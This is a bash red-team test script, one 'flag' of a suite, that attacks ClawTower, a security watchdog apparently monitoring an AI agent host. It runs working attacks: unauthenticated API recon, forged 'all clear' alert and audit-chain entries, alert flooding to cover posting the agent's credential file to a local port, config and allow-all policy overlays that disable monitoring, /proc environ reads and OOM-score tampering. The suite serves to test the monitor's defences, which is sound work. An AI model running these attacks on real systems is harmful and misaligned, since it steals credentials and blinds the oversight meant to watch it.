#!/usr/bin/env bash
# Red Lobster v9 — Flag 23: SELF-TARGETING
# Attacks against ClawTower's own infrastructure.
# The watchdog watches the host — but who watches the watchdog?
# NO sudo. User-level only.
set -uo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/redlobster-lib.sh"

rl_init_flag "flag23" "Flag 23: SELF-TARGETING — Attacks against ClawTower"

CRED="/home/openclaw/.openclaw/agents/main/agent/auth-profiles.json"
ALERT_LOG_PATH="/var/log/clawtower/alerts.jsonl"
AUDIT_CHAIN="/var/log/clawtower/audit.chain"
CT_CONFIG="/etc/clawtower/config.toml"
CT_CONFIGDIR="/etc/clawtower/config.d"
CT_SHADOW="/etc/clawtower/sentinel-shadow"
CT_QUARANTINE="/etc/clawtower/quarantine"
CT_POLICIES="/etc/clawtower/policies"
OUTDIR="$FLAG_DIR"

# ═══ Section A: API Probing (4) ═══
echo "--- Section A: API Probing ---"

# 1. Unauthenticated API enumeration — no auth, full read access
rl_run "unauthenticated API enumeration" \
  "curl -sf http://127.0.0.1:18791/api/status > '$OUTDIR/23_status.json' 2>/dev/null; curl -sf http://127.0.0.1:18791/api/health > '$OUTDIR/23_health.json' 2>/dev/null; curl -sf http://127.0.0.1:18791/api/security > '$OUTDIR/23_security.json' 2>/dev/null"

# 2. API alert history exfil — reveals what's detected and missed
rl_run "API alert history exfil" \
  "curl -sf http://127.0.0.1:18791/api/alerts > '$OUTDIR/23_alerts.json' 2>/dev/null"

# 3. API as recon oracle — security scan results = attack planning blueprint
rl_run "API recon oracle" \
  "python3 -c \"
import urllib.request, json
try:
    data = json.loads(urllib.request.urlopen('http://127.0.0.1:18791/api/security', timeout=2).read())
    # Extract all failing scans — these reveal weaknesses
    fails = [s for s in data if s.get('status') in ('Warn','Fail')]
    open('$OUTDIR/23_3.json','w').write(json.dumps(fails, indent=2))
except: pass
\" 2>/dev/null"

# 4. API health timing — poll for restart gaps, attack during window
rl_run "API health timing" \
  "python3 -c \"
import urllib.request, time
for i in range(5):
    try:
        resp = urllib.request.urlopen('http://127.0.0.1:18791/api/health', timeout=1)
        status = resp.read().decode()
    except:
        open('$OUTDIR/23_4_gap.txt','w').write(f'Gap detected at poll {i}')
        break
    time.sleep(0.5)
\" 2>/dev/null; true"

# ═══ Section B: Alert & Log Manipulation (4) ═══
echo "--- Section B: Alert & Log Manipulation ---"

# 5. Alert log injection — append false "all clear" messages
rl_run "alert log injection" \
  "echo '{\"timestamp\":\"2026-02-20T12:00:00Z\",\"severity\":\"Info\",\"source\":\"scanner\",\"message\":\"scan:security_posture - All systems normal, no threats detected\"}' >> '$ALERT_LOG_PATH' 2>/dev/null; true"

# 6. Audit chain append — break hash chain integrity
rl_run "audit chain append" \
  "echo '{\"seq\":99999,\"hash\":\"0000000000000000000000000000000000000000000000000000000000000000\",\"event\":\"FAKE_ENTRY_RL9\"}' >> '$AUDIT_CHAIN' 2>/dev/null; true"

# 7. Alert flooding + real exfil — exhaust rate limiter then attack
# Generate 22+ rapid alerts from auditd source, then perform network exfil
rl_run "alert flood + real exfil" \
  "for i in \$(seq 1 25); do cat /etc/shadow > /dev/null 2>&1; done; python3 -c \"
import http.client
try:
    c = http.client.HTTPConnection('127.0.0.1', 19999, timeout=2)
    c.request('POST', '/flood-exfil', open('$CRED','rb').read())
except: pass
\""

# 8. Slack webhook URL extraction — read config or strings binary
rl_run "Slack webhook URL extraction" \
  "cat '$CT_CONFIG' 2>/dev/null | grep -i webhook > '$OUTDIR/23_8.txt' 2>/dev/null; strings /usr/local/bin/clawtower 2>/dev/null | grep hooks.slack.com >> '$OUTDIR/23_8.txt' 2>/dev/null; true"

# ═══ Section C: Config & Shadow Poisoning (4) ═══
echo "--- Section C: Config & Shadow Poisoning ---"

# 9. Config.d overlay injection — disable sentinel via config overlay
rl_run "config.d overlay injection" \
  "echo -e '[sentinel]\nenabled = false\n[scans]\nenabled = false' > '$CT_CONFIGDIR/rl9-disable.toml' 2>/dev/null; sleep 1; rm -f '$CT_CONFIGDIR/rl9-disable.toml' 2>/dev/null; true"

# 10. Sentinel shadow copy poisoning — replace shadow content
# If attacker poisons shadow copies, "restore" installs attacker's version
rl_run "shadow copy poisoning" \
  "python3 -c \"
import os, glob
shadows = glob.glob('$CT_SHADOW/**/*', recursive=True)
for s in shadows[:3]:
    if os.path.isfile(s):
        open('$OUTDIR/23_10_found.txt','a').write(f'{s}\n')
        try:
            with open(s,'r') as f: open('$OUTDIR/23_10_orig.txt','a').write(f.read())
        except: pass
\" 2>/dev/null; true"

# 11. Quarantine directory inspection — check if readable/executable
rl_run "quarantine directory abuse" \
  "ls -la '$CT_QUARANTINE' > '$OUTDIR/23_11.txt' 2>/dev/null; find '$CT_QUARANTINE' -type f 2>/dev/null >> '$OUTDIR/23_11.txt'; true"

# 12. Policy file injection — write allow-all YAML to policies dir
rl_run "policy file injection" \
  "cat > '$CT_POLICIES/rl9-allow-all.yaml' 2>/dev/null <<YAMLEOF
name: rl9-allow-all
match:
  command_contains: [\"\"]
enforcement: allow
YAMLEOF
sleep 1; rm -f '$CT_POLICIES/rl9-allow-all.yaml' 2>/dev/null; true"

# ═══ Section D: Process-Level Attacks (3) ═══
echo "--- Section D: Process-Level Attacks ---"

# Find ClawTower PID
CT_PID=$(pgrep -x clawtower 2>/dev/null | head -1)
if [[ -z "$CT_PID" ]]; then
    CT_PID=$(pgrep -f 'clawtower' 2>/dev/null | head -1)
fi

# 13. Signal ClawTower — SIGHUP (reload), SIGUSR1, SIGUSR2
rl_run "signal ClawTower process" \
  "if [[ -n '$CT_PID' ]]; then kill -HUP '$CT_PID' 2>/dev/null; sleep 0.5; kill -USR1 '$CT_PID' 2>/dev/null; sleep 0.5; kill -USR2 '$CT_PID' 2>/dev/null; fi; true"

# 14. /proc/<pid>/ inspection — read ClawTower runtime state
rl_run "/proc/pid inspection" \
  "if [[ -n '$CT_PID' ]]; then cat /proc/'$CT_PID'/cmdline 2>/dev/null | tr '\0' ' ' > '$OUTDIR/23_14.txt'; cat /proc/'$CT_PID'/environ 2>/dev/null | tr '\0' '\n' >> '$OUTDIR/23_14.txt'; ls -la /proc/'$CT_PID'/fd/ 2>/dev/null >> '$OUTDIR/23_14.txt'; cat /proc/'$CT_PID'/maps 2>/dev/null | head -20 >> '$OUTDIR/23_14.txt'; fi; true"

# 15. OOM score manipulation — make ClawTower first to die under pressure
rl_run "OOM score manipulation" \
  "if [[ -n '$CT_PID' ]]; then echo 1000 > /proc/'$CT_PID'/oom_score_adj 2>/dev/null; fi; true"

rl_summary
rl_cleanup
